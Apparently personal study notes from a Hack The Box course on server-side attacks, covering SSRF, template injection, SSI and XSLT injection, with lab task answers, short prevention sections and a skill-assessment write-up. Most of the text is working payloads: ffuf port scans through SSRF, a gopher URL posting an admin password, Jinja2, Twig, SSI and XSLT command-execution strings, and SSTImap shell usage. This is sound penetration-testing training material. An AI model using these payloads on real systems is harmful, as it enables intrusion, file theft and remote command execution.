* **Server-Side Request Forgery (SSRF)**
* **Server-Side Template Injection (SSTI)**
* **Server-Side Includes Injection (SSI)**
* **XSLT Server-Side Injection**

# Server-Side Request Forgery (SSRF)
* server fetches resources based on user input
* in that case, attacker might be able to force server into making a request to arbitrary URLs supplied by attacker
* attacker might be able to use following URL schemes:
	* http, https
	* file://
	* gopher://

## Identifying SSRF
* **Confirming SSRF**
	* supply a URL pointing to our system
	* open netcat listener (`nc -lvnp 8000`)
	* We can also test if the response is reflected to us, by giving URL to localhost, e.g. https://127.0.0.1/index.php
* **Enumerating the system**
	* we can use SSRF to perform a portscan, i.e. just iterate over ports and see what ports are open
	* We could to this via ffuf:
```shellsession
lunims@htb[/htb]$ seq 1 10000 > ports.txt
lunims@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

**Task:** `curl http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:8000/&date=2024-01-01"`

## Exploiting SSRF 
* **Accessing restricted endpoints**
	* directory brute force using ffuf
```shellsession
lunims@htb[/htb]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
* **Local File Inclusion**
	* we can try to use file URL scheme such as file://, e.g. file:///etc/passwd
* **gopher protocol**
	* we are restricted to GET requests, as there is no way to send POST requests with http:// URL scheme only
	* gopher URL scheme can be used to send arbitrary bytes to a TCP socket
```http
POST /admin.php HTTP/1.1 
Host: dateserver.htb 
Content-Length: 13 
Content-Type: application/x-www-form-urlencoded 

adminpw=admin
```
Turn into this gopher URL, needs to be URL-encoded: 
```url
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
Gopher can be used to interact with many internal services, e.g. SQL DBMSes or SMTP services.

**Gopherus**
https://github.com/tarunkant/Gopherus -> Tool that helps us creating gopher URLs
```bash
python2.7 gopherus.py
```
```bash
python2.7 gopherus.py --exploit smtp
```

**Task:** `curl http://10.129.27.77/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/admin.php&date=2024-01-01"`

## Blind SSRF
* in many real-word SSRF vulnerabilities, the response is not directly displayed to us
* **Identifying Blind SSRF**
	* we can confirm basically like before, open netcat listener and send request to our system
* **Exploiting Blind SSRF**
	* comparatively limited options to non-blind SSRF vulnerabilities
	* We might still be able to perform a local port scan based on different error messages
		* we might only be able to check what ports are open, but not what services are using this port
	* LFI: we might not be able to read content, but we can confirm the existence of certain files

Task: `ffuf -u http://10.129.27.83/index.php -w ports.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb:FUZZ/availability.php&date=2024-01-01" -mr "Date is unavailable. Please choose a different date"`

## Prevention
* URL should be checked against an allow-list
* allowed URL schemes should be restricted
* also input sanitization
* https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

# Server-Side Template Injection (SSTI)
## Template Engines
* a template engine is software that combines pre-defined templates with dynamically generated data
* often used by web apps to generate dynamic responses
* Popular examples: Jinja and Twig

### Templating 
* template engines usually require two inputs: a template and a set of values to be inserted
* template can be provided as string or file, it contains pre-defined places where template engines inserts the dynamic values
* values are provided as key-value pairs, allowing engine to place the value at location marked with corresponding key 
* Generating a string from the input template and input values is referred to as `rendering`
Jinja2 Syntax:
```jinja2
Hello {{ name }}!
```
Name value is provided, rendered output would be for example Hello John!
Loops:
```jinja2
{% for name in names %} 
Hello {{ name }}! 
{% endfor %}
```

## SSTI
* occurs when an attacker can inject templating code into a template that is later rendered by the server
* if attacker injects malicious code, server may execute code during rendering process
* Occurs when attacker is able to control the template parameter
* if templating is implemented correctly: user input is always provided to rendering function in values and **never** in the template string

## Identifying SSTI
* **Confirming SSTI**
	* most effective way: inject special character with a semantic meaning in template engines and observe web apps behavior
	* Common Test string:
```txt
${{<%[%'"}}%\.
```
* **Identifying the Template Engine**
	* we need to know what template engine is used for successful exploitation
	* Payload for jinja2 (and some others): `{{7*7}}` -> jinja2 or twig if 49
	* `{{7*'7'}}`
		* 49 twig
		* jinja2 7777777

## Exploiting SSTI - Jinja2
**Information Disclosure**
	* obtain internal information about the system
```jinja2
{{ config.items() }}
```
Dump all availabe built-in functions:
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
**Local File Inclusion**
Use Python's built in open function to include a local file
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
**Remote Code Execution**
We can use functions provided by os lib, suchas system or popen. However, if web app has not imported those yet, we need to first import it ourselves
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Task:** `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`

## Exploiting SSTI - Twig
**Information Disclosure**
```twig
{{ _self }}
```
**Local File Inclusion**
Reading local files using built in functions (without using the same way as for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
**Remote Code Execution**
We can use PHP built in function system. We can pass an argument to this function by using Twigs filter function
```twig
{{ ['id'] | filter('system') }}
```

**Task:** `{{ ['cat /flag.txt'] | filter('system') }}`

## SSTI Tools of the Trade & Preventing SSTI
### Tools of the Trade
* most popular tool for identifying/exploiting SSTI is [tplmap](https://github.com/epinna/tplmap)
	* no longer maintained and runs on deprecated python2
* more modern [SSTImap](https://github.com/vladko312/SSTImap)
* Usage:
```shellsession
lunims@htb[/htb]$ git clone https://github.com/vladko312/SSTImap lunims@htb[/htb]$ cd SSTImap 
lunims@htb[/htb]$ pip3 install -r requirements.txt 
lunims@htb[/htb]$ python3 sstimap.py
```
To automatically identify any SSTI vulnerabilities, we need to provide a target URL
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```
We could download a remote file using the -D flag:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```
Execute System command with -S flag:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```
--os-shell flag to obtain an interactive shell:
```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

### Prevention
* ensure that user input is never passed to the template engine's rendering function in the template parameter
* this can be achieved by carefully going through the different code paths 
* sometimes, web apps allow users to modify existing templates or uplaod new ones:
	* it is crucial to implement proper hardening measures 
	* remove potentially dangerous functions (prone to bypasses)
	* better: seperate execution environment in which template engine runs entirely from web server, for instance, by setting up a separate execution environment such as a Docker container

# Server-Side Includes Injection (SSI)
* Server-Side Includes is a technology that web apps use to create dynamic content on HTML pages
* SSI is supported by many popular web servers such as Apache and IIS
* use of SSI can often be inferred from file extension: `.shtml`, `.shtm` or `.stm` 

## SSI Directives
* SSI utilizes `directives` to add dynamically generated content to a static HTML page
* conists of three components
	* `name` -> directives name
	* `parameter name` -> one or more parameters
	* `value` -> one or more paramter values
* An SSI has following syntax:
```SSI
<!--#name param1="value1" param2="value" -->****
```
**printenv** directives prints environment values:
```SSI
<!--#printenv -->
```
**config** changes SSI configuration by specifying corresponding parameters. For example, change the error message using `errormsg` parameter
```SSI
<!--#config errmsg="Error!" -->
```
**echo** prints value of any parameter given in the `var` parameter. Multiple variable can be printed by specifying multiple var paramters:
* DOCUMENT_NAME
* DOCUMNET_URI
* LAST_MODIFIED
* DATE_LOCAL
```SSI
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```
Execute system command with **exec** directive:
```SSI
<!--#exec cmd="whoami" -->
```
**include** directive includes file specified in `virtual parameter` (only allow inclusion of files within web root directory) 
```SSI
<!--#include virtual="index.html" -->
```
## Exploiting SSI Injection
* guess that page supports SSI via the file extension
* if input is inserted into page without proper sanitization, it might be vulnerable
* Confirm with test string like: `<!--#printenv -->`
* We can then use exec payloads as above to execute system commands: `<!--#exec cmd="whoami" -->`
**Task:** `<!--#exec cmd="cat /flag.txt" -->`
### Prevention
* input validation
* input sanitization
* additionally:
	* configure web server to restrict use of SSI to particular file extensions and potentially even particular directories
	* capabilities of specific SSI directives can be limited to mitigate impact of SSI injection vulnerabilities
		* for example, disable exec directive if not required

# XSLT Server-Side Injection
## eXtensible Stylesheet Language Transformation (XSLT)
* XSLT is a language enabling transformation of XML documents
* Consider following sanple XML doc:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<fruits>     
	<fruit>         
		<name>Apple</name>         
		<color>Red</color>         
		<size>Medium</size>     
	</fruit>     
	<fruit>         
		<name>Banana</name>         
		<color>Yellow</color>         
		<size>Medium</size>     
	</fruit>     
	<fruit>         
		<name>Strawberry</name>         
		<color>Red</color>
		<size>Small</size>
	</fruit> 
</fruits>
```
* XSLT can be used to define a data format that is subsequently enriched with data from the XML document 
* XSLT data is structured similarly to XML, but it contains XSL elements within nodes prefixed with the `xsl` prefix
	* `<xsl:template>`: indicates an XSL template, it can contain a `match` attribtue that contains a path in the XML document that template applies to
	* `<xsl-value-of>`: element extracts value of the XML node specified in the `select attribtue`
	* `<xsl-for-each>`: element enables looping over all XML nodes specified in the `select` attribute
Example: XSLT document used to output all fruits contained within XML documents, as well as their color:
```xslt
<?xml version="1.0"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits"> Here are all the fruits: 
		<xsl:for-each select="fruit"> 
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each> 
	</xsl:template> 
</xsl:stylesheet>
```
Combining the XML with the XSLT will result in following output:
```txt
Here are all the fruits:     
	Apple (Red)     
	Banana (Yellow)     
	Strawberry (Red)
```
Additional XSL elements:
* `<xsl-sort>`: element specifies how to sort elements in a for loop in the `select` statement, additionally a sort order may be specified in the `order` argument
* `<xsl-if>`: element can be used to test for conditions on a node. Condition is specified in `test` argument
Example: Create a list of all fruits that are of medium size, ordered by their color in descending order
```xslt
<?xml version="1.0"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits"> Here are all fruits of medium size ordered by their color: 
		<xsl:for-each select="fruit"> 
			<xsl:sort select="color" order="descending" /> 
			<xsl:if test="size = 'Medium'"> 
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			 </xsl:if> 
		 </xsl:for-each> 
	 </xsl:template> 
 </xsl:stylesheet>
```
**XSLT Injection:** As the name suggests, this is an attack where user input is unsafely inserted into XSL data before XSLT processor generates output. Attacker is able to inject additional XSL elements into the XSL data.

## Exploiting XSLT Injection
### Identifying XSLT Injection
* try to insert a broken XML tag to invoke an error in the web app, for example with `<` character
### Information Disclosure
We can try to infer basic information using following elements:
```xslt
Version: <xsl:value-of select="system-property('xsl:version')" /> 
<br/> 
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /> 
<br/> 
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /> 
<br/> 
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /> <br/> 
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```
### Local File Inclusion
We can try using multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library.
XSLT contains a function unparse-text that can be used to read a local file:
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
Only introduced in XSLT version 2.0

If the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
### Remote Code Execution
If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command:
```xml
<xsl:value-of select="php:function('system','id')" />
```

**Task:** `<xsl:value-of select="php:function('system','cat /flag.txt')" />`
### Prevention
* ensure that user input is not inserted into XSL data before its processed by the XSLT processor
* if needed, user-provided data is necessary: input sanitization and validation
	* for example, HTML encode characters before
* Additional configuration: Give XSLT low privileges

# Skill Assessment

I found that the Endpoint http://154.57.164.81:30696/ fetches a URL. 
I first tested for a SSRF with file protocol URL but that did not work. I then tested if i can inject a SSTI payload. That actually worked: {{7\*7}} resulted in 49.
I Then tested 7*'7', which resulted in 49, so i know it is twig.
After some trying i got following payload to work in order to get the flag:
api=http://truckapi.htb/?id={{['cat${IFS}/flag.txt']|filter('system')}}